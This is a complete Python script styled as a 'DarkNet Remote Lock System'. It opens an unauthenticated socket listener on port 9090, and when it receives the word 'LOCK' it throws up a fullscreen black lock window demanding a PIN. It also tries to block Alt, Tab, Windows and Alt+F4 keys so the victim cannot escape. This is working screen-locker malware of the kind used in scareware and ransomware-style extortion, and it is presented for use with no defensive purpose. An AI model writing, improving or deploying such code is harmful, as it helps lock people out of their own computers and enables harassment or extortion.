import socket
import tkinter as tk
import pyautogui
import keyboard
import os

# ------------- CMD BANNER -------------
os.system("cls")  # Clear screen
print(r"""
██████╗  █████╗ ██████╗ ██╗  ██╗███╗   ██╗███████╗████████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝████╗  ██║██╔════╝╚══██╔══╝
██████╔╝███████║██████╔╝█████╔╝ ██╔██╗ ██║█████╗     ██║   
██╔══██╗██╔══██║██╔══██╗██╔═██╗ ██║╚██╗██║██╔══╝     ██║   
██║  ██║██║  ██║██║  ██║██║  ██╗██║ ╚████║███████╗   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   

                ★ DARKNET REMOTE LOCK SYSTEM ★
""")

# ------------- SETTINGS -------------
PORT = 9090
UNLOCK_PIN = "1234"

pyautogui.FAILSAFE = False

# ------------------------------------
def lock_screen():
    keys = ["alt", "tab", "alt+tab", "win", "ctrl+esc", "alt+f4"]
    for k in keys:
        try:
            keyboard.block_key(k)
        except:
            pass

    win = tk.Tk()
    win.attributes("-fullscreen", True)
    win.configure(bg="black")

    title = tk.Label(
        win,
        text="DarkNet LOCKED SYSTEM",
        fg="red", bg="black",
        font=("Arial", 40, "bold")
    )
    title.pack(pady=20)

    label = tk.Label(
        win, text="ENTER PIN TO UNLOCK",
        fg="white", bg="black",
        font=("Arial", 30)
    )
    label.pack(pady=30)

    entry = tk.Entry(win, show="*", font=("Arial", 30))
    entry.pack()

    def check():
        if entry.get() == UNLOCK_PIN:
            win.destroy()

    btn = tk.Button(win, text="UNLOCK", font=("Arial", 30), command=check)
    btn.pack(pady=30)

    win.mainloop()


# ---------------- SOCKET LISTENER ----------------
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", PORT))
sock.listen(1)

print("\n[DarkNet] Waiting for LOCK command...\n")

while True:
    conn, addr = sock.accept()
    data = conn.recv(1024).decode()

    if data == "LOCK":
        lock_screen()

    conn.close()
